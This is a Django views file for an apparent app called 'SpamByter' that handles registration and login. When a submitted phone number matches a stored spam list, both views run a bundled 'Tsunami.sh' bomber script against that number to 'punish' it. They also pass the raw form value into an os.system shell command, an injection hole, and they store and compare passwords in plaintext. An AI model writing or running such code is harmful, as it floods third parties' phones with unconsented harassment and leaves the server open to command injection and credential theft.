from django.shortcuts import render
from django.http import HttpResponse
from .models import GenUsers, SpamUsers
import os
# Create your views here.
def index(request):
    #return HttpResponse("SpamByter Reg")
    return render(request,'index.html')

def Register(request):
    if request.method == 'POST':
        phno=request.POST.get('PhoneNo')
        #retrieving PhoneNo from SpamUsers Model
        sp_phno = [p.PhoneNo for p in SpamUsers.objects.all()]
        #print(sp_phno,type(sp_phno[0]))
        #print(phno,type(phno))
        #check if  exist in SpamUser Model
        if phno in sp_phno:
            #Punish
            #print("Bomb to this Spam User ")
            os.system("chmod +x ./static/Bomber/Tsunami.sh")
            os.system("printf '"+phno+"\n1\n' | ./static/Bomber/Tsunami.sh")
            return HttpResponse("<script>alert('Bombing to this Spam User...\n ');</script>")
        else:
            gn_phno= [p.PhoneNo for p in GenUsers.objects.all()]
            # If phno already existed in
            if phno not in gn_phno:
                email = request.POST.get("email")
                pswd = request.POST.get("pswd")
                genusr = GenUsers(email = email, PhoneNo = phno, password=pswd)
                genusr.save()
                signin= {"status":"signin"}
            else:
                return HttpResponse("<script>alert('Phone Number Already exist');</script>")
            return render(request, 'HomeResult.html', context= signin)

def LoginPage(request):
    return render(request, 'LoginPage.html')

def Login(request):
    phno = request.POST.get('PhoneNo')
    pswd = request.POST.get('pswd')
    # retrieving PhoneNo from SpamUsers Model
    sp_phno = [p.PhoneNo for p in SpamUsers.objects.all()]
    # check if  exist in SpamUser Model
    if phno in sp_phno:
        # Punish
        # print("Bomb to this Spam User ")
        os.system("chmod +x ./static/Bomber/Tsunami.sh")
        os.system("printf '" + phno + "\n1\n' | ./static/Bomber/Tsunami.sh")
        return HttpResponse("<script>alert('Bombing to this Spam User...\n ');</script>")
    else:
        #retrieving GenUser infos
        gn_phno = [p.PhoneNo for p in GenUsers.objects.all()]
        if phno in gn_phno:
            gn = GenUsers.objects.get(PhoneNo=phno)
            if pswd == gn.password:
                signin = {"status": "signin"}
                return render(request, 'HomeResult.html', context=signin)
            else:
                #print("failed")
                return HttpResponse("<script>alert('PhoneNo or Password Wrong... Enter Correct details');</script>")
        else:
            #print("failed")
            return HttpResponse("<script>alert('PhoneNo Not registered... Enter Registered details');</script>")


    return render(request, 'LoginPage.html')